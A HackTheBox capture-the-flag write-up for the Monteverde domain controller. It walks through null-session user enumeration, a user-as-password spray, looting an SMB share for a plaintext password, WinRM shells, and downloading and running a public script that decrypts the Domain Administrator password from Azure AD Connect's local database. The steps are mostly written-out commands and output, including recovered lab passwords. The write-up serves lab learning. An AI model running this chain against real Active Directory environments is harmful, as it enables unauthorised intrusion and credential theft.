# Monteverde - HackTheBox Writeup

**OS:** Windows (Server 2019, Domain Controller)
**Difficulty:** Medium
**Topics:** Null Session Enumeration, enum4linux, User-as-Password Spray, SMB Share Looting, Azure AD Connect Credential Extraction, DCSync-equivalent Privesc

---

## Enumeration

```bash
nmap -sC -sV -v 10.129.82.112
```

Relevant ports:
- **53** - DNS (Simple DNS Plus)
- **88** - Kerberos
- **135/139/445** - RPC/NetBIOS/SMB
- **389/3268** - LDAP, `Domain: MEGABANK.LOCAL`
- **464** - kpasswd5
- **593** - RPC over HTTP
- **5985** - WinRM (HTTPAPI)

Host info: `Host: MONTEVERDE; OS: Windows`. SMB signing is enabled and required.

### Null session user enumeration

```bash
enum4linux -U 10.129.82.112 > enum4linux_output.txt
```

A null session (`username ''`, `password ''`) is allowed, confirming the host is domain-joined (`MEGABANK`, SID `S-1-5-21-391775091-850290835-3566037492`) and dumping the full domain user list:

```
AAD_987d7f2f57d2   (Service account for the Synchronization Service - Azure AD Connect)
dgalanos           (Dimitris Galanos)
Guest
mhope              (Mike Hope)
roleary            (Ray O'Leary)
SABatchJobs
smorgan            (Sally Morgan)
svc-ata
svc-bexec
svc-netapp
```

Extract just the usernames into a wordlist:

```bash
grep -oP '(?<=Account: )\S+' enum4linux_output.txt > users.txt
```

> The `AAD_...` account name and its description are the first hint this box involves Azure AD Connect sync.

---

## Foothold - User-as-Password Spray

Tried each username as its own password (a surprisingly common real-world misconfiguration) against SMB:

```bash
nxc smb 10.129.82.112 -d MEGABANK.LOCAL -u users.txt -p users.txt
```

Hit:

```
SMB  10.129.82.112  445  MONTEVERDE  [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs
```

### Share enumeration and looting

```bash
nxc smb 10.129.82.112 -d MEGABANK.LOCAL -u SABatchJobs -p SABatchJobs --shares
```

`users$` is readable. Connect and pull everything:

```bash
smbclient //10.129.82.112/users$ -U 'MEGABANK.LOCAL\SABatchJobs%SABatchJobs'
```

Inside `mhope`'s profile folder (e.g. `\mhope\Desktop\`) is an **`azure.xml`** file - a serialized `Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential` PowerShell object, containing a plaintext `<S N="Password">` field:

```xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <Props>
      <S N="Password">4n0therD4y@n0th3r$</S>
    </Props>
  </Obj>
</Objs>
```

No username is stored in the file itself - it belongs to the account whose folder it was found in (`mhope`).

### WinRM access

```bash
nxc smb 10.129.82.112 -d MEGABANK.LOCAL -u mhope -p '4n0therD4y@n0th3r$'
nxc winrm 10.129.82.112 -d MEGABANK.LOCAL -u mhope -p '4n0therD4y@n0th3r$'
evil-winrm -i 10.129.82.112 -u mhope -p '4n0therD4y@n0th3r$'
```

-> Shell as `mhope`. `user.txt` readable from `C:\Users\mhope\Desktop\`.

---

## Privilege Escalation - Azure AD Connect Credential Extraction

### 1. Identify the interesting group membership

```powershell
net user mhope
```

```
Global Group memberships   *Azure Admins   *Domain Users
```

`Azure Admins` is not a built-in AD group - it's created by **Azure AD Connect** during installation. This, combined with the `AAD_987d7f2f57d2` sync account seen during enum4linux, points squarely at Azure AD Connect as the privesc vector.

> **Background**: Azure AD Connect (which syncs an on-prem AD to Azure AD / Entra ID) uses Password Hash Synchronization internally via the same Directory Replication Service (DRS) API that `DCSync` abuses. The sync account it creates typically holds `Replicating Directory Changes` rights on the domain. Its credentials are stored locally (encrypted) in a SQL Server LocalDB instance (`(localdb)\.\ADSync`) feeding the `ADSync` Windows service, and can be decrypted by anyone able to query that DB and load the service's own `mcrypt.dll`. Reference: [Azure AD Connect for Red Teamers - xpnsec](https://blog.xpnsec.com/azuread-connect-for-redteam/)

### 2. Extract the credentials from the local ADSync database

Uploaded a ready-made extraction script ([Azure-ADConnect.ps1](https://raw.githubusercontent.com/Hackplayers/PsCabesha-tools/master/Privesc/Azure-ADConnect.ps1) by Luis Vacas / CyberVaca, based on the xpnsec research) to the target:

```powershell
# On Kali
wget https://raw.githubusercontent.com/Hackplayers/PsCabesha-tools/master/Privesc/Azure-ADConnect.ps1

# Inside evil-winrm
upload Azure-ADConnect.ps1
```

Dot-source it (it defines a `Function`, not a formal module - `Import-Module` alone won't expose it) and run it against the local LocalDB instance:

```powershell
. .\Azure-ADConnect.ps1
Azure-ADConnect -server localhost -db ADSync
```

Output:

```
[+] Domain:   MEGABANK.LOCAL
[+] Username: administrator
[+] Password: d0m@in4dminyeah!
```

The script connects to the `mms_management_agent` / `mms_server_configuration` tables in the local SQL LocalDB, loads `C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll`, and uses the service's own `KeyManager` to decrypt the stored `forest-login-user` / `forest-login-password` used by the AD connector - which, on this box, **is the Domain Administrator account itself**.

### 3. Administrator access

```bash
evil-winrm -i 10.129.82.112 -u administrator -p 'd0m@in4dminyeah!'
```

-> Shell as `MEGABANK\administrator`. `root.txt` on `C:\Users\Administrator\Desktop\`.

---

## Summary

| Step | Technique | Tool |
|------|-----------|------|
| Recon | TCP scan, AD/DC fingerprinting | nmap |
| Null session | Dump domain users | enum4linux |
| Wordlist | Extract usernames from enum4linux output | grep |
| Foothold attempt | User-as-password spray | NetExec (nxc) |
| Loot | SMB share access, found `azure.xml` with plaintext password | smbclient |
| Foothold | WinRM with credentials recovered from azure.xml | evil-winrm |
| Local enum | Spotted `Azure Admins` group + `AAD_...` sync account | `net user` |
| PrivEsc | Decrypt Azure AD Connect sync credentials from local LocalDB | Azure-ADConnect.ps1 |
| Admin access | Domain Admin creds recovered directly from AD Connect config | evil-winrm |

---

## OSCP Notes

- A null session (`enum4linux`, `rpcclient -U "" -N`) is always worth trying first on SMB/445 against a DC - it frequently leaks the full domain user list for free, before any credentials exist.
- **User-as-password** (`-u users.txt -p users.txt` with NetExec) is a cheap, high-value spray to try very early - it costs one login attempt per account and regularly hits service/legacy accounts.
- Any time credentials for one user are found sitting in **another user's** profile/share (here, `mhope`'s password in a file an `SABatchJobs`-readable share could reach), treat it as intentional lateral movement, not noise.
- A group name like `Azure Admins` that isn't a standard built-in AD group is a strong signal that **Azure AD Connect** is installed somewhere in the environment - go looking for the sync service and its local credential store.
- Azure AD Connect's sync account effectively has **DCSync-equivalent** replication rights on-prem; compromising the server running the connector (or an account in its admin group) is often a direct path to Domain Admin, without ever touching `secretsdump.py`'s classic DCSync flow.
- `Import-Module` does not always expose a script's functions - if a `Function Name { ... }` block isn't recognized afterward, dot-source it instead: `. .\script.ps1`.
